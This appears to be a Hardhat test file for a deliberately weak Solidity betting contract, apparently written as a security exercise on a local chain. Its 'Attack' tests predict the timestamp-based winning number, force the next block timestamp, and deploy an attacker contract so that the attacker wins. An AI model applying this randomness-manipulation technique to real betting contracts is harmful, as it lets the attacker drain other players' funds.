const {
  loadFixture,
  time,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const userBet = 50;
const attackerBet = 15;
const ownerBet = 89;
describe("Weak Randomess", function () {
  async function deployFixture() {
    const [owner, user, attacker] = await ethers.getSigners();
    const WeakRandomnessBet = await ethers.getContractFactory(
      "WeakRandomnessBet"
    );
    const weakRandomnessBet = await WeakRandomnessBet.deploy();
    return { weakRandomnessBet, owner, user, attacker };
  }

  async function deployFixtureAttack() {
    const [owner, user, attacker] = await ethers.getSigners();
    const WeakRandomnessBet = await ethers.getContractFactory(
      "WeakRandomnessBet"
    );
    const weakRandomnessBet = await WeakRandomnessBet.deploy();
    await ethers.provider.send("evm_mine");
    const WeakRandomnessBetAttack = await ethers.getContractFactory(
      "WeakRandomnessBetAttack",
      attacker
    );
    const weakRandomnessBetAttack = await WeakRandomnessBetAttack.deploy(
      weakRandomnessBet.target
    );
    return {
      weakRandomnessBet,
      owner,
      user,
      attacker,
      weakRandomnessBetAttack,
    };
  }

  it("Deploy should be ok", async function () {
    const { weakRandomnessBet, owner } = await loadFixture(deployFixture);
    expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
      0
    );
  });
  it("Should get a random number", async function () {
    const { weakRandomnessBet, owner } = await loadFixture(deployFixture);
    expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
      0
    );
    const number = await weakRandomnessBet.getRandomNumber();
    expect(number).to.be.lt(256);
  });
  it("Should be able to bet", async function () {
    const { weakRandomnessBet, owner, user } = await loadFixture(deployFixture);
    expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
      0
    );
    await weakRandomnessBet
      .connect(user)
      .placeBet(userBet, { value: ethers.parseEther("1") });
    expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
      ethers.parseEther("1")
    );
    await weakRandomnessBet.closeBets();
    expect(await weakRandomnessBet.bets(user.address)).to.equal(userBet);
    const winningNumber = await weakRandomnessBet.winningNumber();
    expect(winningNumber).to.be.lt(101);
    console.log("Winning Number: ", winningNumber);
  });
  it("Only winner can call withdraw", async function () {
    const { weakRandomnessBet, owner, user, attacker } = await loadFixture(
      deployFixture
    );
    expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
      0
    );
    await weakRandomnessBet
      .connect(user)
      .placeBet(userBet, { value: ethers.parseEther("1") });
    await weakRandomnessBet
      .connect(attacker)
      .placeBet(attackerBet, { value: ethers.parseEther("1") });
    await weakRandomnessBet.placeBet(ownerBet, {
      value: ethers.parseEther("1"),
    });

    let winNumber = 0;
    let round = 0;
    while (winNumber != userBet) {
      await weakRandomnessBet.closeBets();
      winNumber = await weakRandomnessBet.winningNumber();
      round++;
      console.log("Winning Number: ", winNumber, "in round: ", round);
    }
    // console.log(await ethers.provider.getBlock("latest"));
    await expect(
      weakRandomnessBet.connect(attacker).withdraw()
    ).to.revertedWith("You didn't win");
    const balance = await ethers.provider.getBalance(user.address);
    await weakRandomnessBet.connect(user).withdraw();
    expect(await ethers.provider.getBalance(user.address)).to.be.greaterThan(
      balance
    );
  });

  describe("Attack", function () {
    it("Minner Attack", async function () {
      const abi = ethers.defaultAbiCoder;
      const { weakRandomnessBet, owner, user, attacker } = await loadFixture(
        deployFixture
      );
      await weakRandomnessBet
        .connect(user)
        .placeBet(userBet, { value: ethers.parseEther("1") });
      await weakRandomnessBet
        .connect(attacker)
        .placeBet(attackerBet, { value: ethers.parseEther("1") });
      await weakRandomnessBet.placeBet(ownerBet, {
        value: ethers.parseEther("1"),
      });

      let targetTimeStamp = (await ethers.provider.getBlock("latest")).toJSON()
        .timestamp;

      while (true) {
        const randomUint = (targetTimeStamp % 100) + 1;
        console.log(
          "Creating timestamp: " +
            targetTimeStamp +
            " Current number: " +
            randomUint
        );
        if (randomUint == attackerBet) {
          console.log("Found next TimeStamp: " + targetTimeStamp);
          break;
        }
        targetTimeStamp++;
      }
      await network.provider.send("evm_setNextBlockTimestamp", [
        targetTimeStamp,
      ]);
      let winNumber = 0;
      let round = 0;
      const attackerBalance = await ethers.provider.getBalance(
        attacker.address
      );
      while (winNumber != attackerBet) {
        await weakRandomnessBet.closeBets();
        winNumber = await weakRandomnessBet.winningNumber();
        round++;
        console.log("Winning Number: ", winNumber, "in round: ", round);
      }
      await weakRandomnessBet.connect(attacker).withdraw();
      expect(
        await ethers.provider.getBalance(attacker.address)
      ).to.be.greaterThan(attackerBalance);
    });
    it("Attack from Smart Contract", async function () {

      const { weakRandomnessBet, user, attacker, weakRandomnessBetAttack } = await deployFixtureAttack();
      await ethers.provider.send("evm_setAutomine", [false]);
      await weakRandomnessBetAttack.connect(attacker).attack({ value: ethers.parseEther("10") });
      await weakRandomnessBet.closeBets();
      await ethers.provider.send("evm_mine");
      await ethers.provider.send("evm_mine");
      const attackerContractAddress = weakRandomnessBetAttack.target;      
      const attackerNumber = await weakRandomnessBet.getBetOf(attackerContractAddress);
      const winningNumber = await weakRandomnessBet.getWinningNumber();
      console.log("Attacker Number: ", attackerNumber);
      console.log("Winning Number: ", winningNumber);
      expect(attackerNumber).to.equal(winningNumber);
    });
  });
});
